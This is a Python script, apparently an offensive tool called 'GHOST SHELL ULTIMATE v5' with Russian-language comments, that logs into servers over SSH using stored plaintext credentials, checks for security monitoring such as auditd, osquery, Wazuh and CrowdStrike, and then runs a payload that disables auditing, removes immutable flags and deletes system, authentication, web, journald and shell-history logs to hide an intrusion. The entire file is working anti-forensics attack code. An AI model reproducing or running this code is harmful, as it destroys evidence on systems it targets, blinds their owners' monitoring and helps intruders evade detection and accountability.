import paramiko
import json
import os
import time
import sys

DB_FILE = "ghost_vault.json"

def load_vault():
    if os.path.exists(DB_FILE):
        with open(DB_FILE, "r") as f: return json.load(f)
    return {}

def save_to_vault(ip, user, pwd, port=22):
    db = load_vault()
    db[ip] = {"user": user, "pwd": pwd, "port": port}
    with open(DB_FILE, "w") as f: json.dump(db, f, indent=4)
    print(f"\n[+] Сервер {ip} добавлен в базу.")

def ghost_execute(ip, user, pwd, port=22):
    print(f"\n[*] Подключение к {ip}...")
    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        
        # Коннект с защитой от фризов
        client.connect(hostname=ip, username=user, password=pwd, port=port,
                       timeout=20, banner_timeout=20, look_for_keys=False, allow_agent=False)

        # --- БЛОК РАЗВЕДКИ (RECON) ---
        print("[*] Сканирование систем слежения...")
        # Проверяем процессы и атрибуты файлов
        recon_cmds = [
            "ps aux | grep -E 'auditd|osqueryd|wazuh|agent|crowdstrike|aide|tripwire' | grep -v grep",
            "lsattr /var/log/auth.log 2>/dev/null | cut -d' ' -f1",
            "systemctl is-active auditd 2>/dev/null"
        ]
        
        results = []
        for cmd in recon_cmds:
            _, stdout, _ = client.exec_command(cmd)
            results.append(stdout.read().decode().strip())

        monitors, attributes, audit_status = results[0], results[1], results[2]

        if monitors or audit_status == "active":
            print(f"[!] ВНИМАНИЕ: Обнаружена активная слежка: {monitors or 'auditd'}")
            if input("[?] Риск обнаружения высокий. Продолжить зачистку? (y/n): ").lower() != 'y':
                client.close()
                return

        if 'i' in attributes:
            print("[!] ОБНАРУЖЕН IMMUTABLE-БИТ: Файлы логов защищены от удаления.")
            print("[*] Скрипт попытается снять защиту через chattr -i.")

        # --- ПАКЕТ ДЕЙСТВИЙ (PAYLOAD) ---
        payload = [
            # 1. Скрываем ввод
            "unset HISTFILE && export HISTSIZE=0 && export HISTCONTROL=ignorespace",
            
            # 2. Ослепляем системы аудита и снимаем защиту с файлов
            f"echo '{pwd}' | sudo -S auditctl -e 0 2>/dev/null",
            f"echo '{pwd}' | sudo -S chattr -i /var/log/auth.log /var/log/lastlog /var/log/wtmp 2>/dev/null",
            
            # 3. Уничтожение бинарных логов
            f"echo '{pwd}' | sudo -S rm -rf /var/log/wtmp* /var/log/btmp* /var/log/lastlog* /var/run/utmp*",
            f"echo '{pwd}' | sudo -S touch /var/log/wtmp /var/log/lastlog /var/run/utmp",
            
            # 4. Уничтожение текстовых логов и архивов
            f"echo '{pwd}' | sudo -S rm -rf /var/log/auth.log* /var/log/secure* /var/log/syslog* /var/log/messages*",
            f"echo '{pwd}' | sudo -S rm -rf /var/log/apache2/* /var/log/nginx/*",
            
            # 5. Очистка JOURNALD (главный источник "палева")
            f"echo '{pwd}' | sudo -S journalctl --vacuum-time=1s >/dev/null 2>&1",
            f"echo '{pwd}' | sudo -S rm -rf /var/log/journal/* /run/log/journal/*",
            f"echo '{pwd}' | sudo -S systemctl restart systemd-journald 2>/dev/null || true",
            
            # 6. Заметание истории всех оболочек
            "rm -rf ~/.bash_history ~/.zsh_history ~/.python_history ~/.mysql_history",
            f"echo '{pwd}' | sudo -S rm -rf /root/.bash_history /root/.zsh_history /home/*/.bash_history",
            
            # 7. Финальный сброс
            "history -c",
            "sync"
        ]

        full_payload = " ; ".join(payload)
        client.exec_command(full_payload)
        
        print("[*] Выполняю глубокую дезинфекцию...")
        time.sleep(4)
        
        print(f"[SUCCESS] Операция на {ip} завершена. Следы подметены.")
        client.close()

    except Exception as e:
        print(f"[ERROR] Сбой операции: {e}")

def main():
    vault = load_vault()
    print("\n" + "="*40)
    print("   GHOST SHELL ULTIMATE v5 (RECON)   ")
    print("="*40)
    
    if vault:
        targets = list(vault.keys())
        for i, t in enumerate(targets, 1):
            print(f" [{i}] {t} (as {vault[t]['user']})")
        print(" [0] Добавить новую цель")
        
        idx = input("\nВыбор: ").strip()
        if idx != '0' and idx.isdigit() and int(idx) <= len(targets):
            ip = targets[int(idx)-1]
            u, p, port = vault[ip]['user'], vault[ip]['pwd'], vault[ip]['port']
        else:
            ip = input("IP: ").strip()
            u = input("User: ").strip()
            p = input("Pass: ").strip()
            port = int(input("Port [22]: ") or 22)
            if input("Сохранить в базу? (y/n): ").lower() == 'y': save_to_vault(ip, u, p, port)
    else:
        ip = input("IP: ").strip()
        u = input("User: ").strip()
        p = input("Pass: ").strip()
        port = int(input("Port [22]: ") or 22)
        if input("Сохранить в базу? (y/n): ").lower() == 'y': save_to_vault(ip, u, p, port)

    ghost_execute(ip, u, p, port)

if __name__ == "__main__":
    try: main()
    except KeyboardInterrupt: sys.exit()